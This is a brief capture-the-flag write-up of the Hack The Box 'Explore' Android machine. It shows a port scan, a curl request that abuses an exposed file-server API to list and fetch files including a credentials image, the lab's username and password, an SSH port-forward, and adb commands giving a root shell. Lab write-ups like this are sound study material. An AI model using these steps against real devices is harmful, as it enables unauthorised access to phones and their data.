---
title: Explore
description: Android adb OP
date: 05/01/2022
---

# Explore HTB

Let's enumarate the machine.

```text
PORT      STATE    SERVICE
2222/tcp  open     EtherNetIP-1
5555/tcp  filtered freeciv
42135/tcp open     unknown => web
46125/tcp open     unknown
59777/tcp open     unknown => web
```

I found this command/exploit and used it to enumerate the JSONAPI server.

```bash
curl -XPOST --header "Content-Type: application/json" --data "{\\"command\\":\\"listFiles\\"}" http://explore.htb:59777/sdcard/dcim
```

- http://explore.htb:59777/sdcard/user.txt

- http://explore.htb:59777/sdcard/dcim/creds.jpg

![](images/creds.png)

| user   | password            |
| ------ | ------------------- |
| kristi | Kr1sT!5h@Rp3xPl0r3! |

now let's portforward to access the port **5555** :

```bash
ssh -p 2222 -L 8888:localhost:5555 kristi@explore.htb
```

After that juste connect via ADB and voila you now have root access.

```bash
$ adb connect explore.htb:5555
$ adb shell
$ su
```

## Thanks for reading ;)
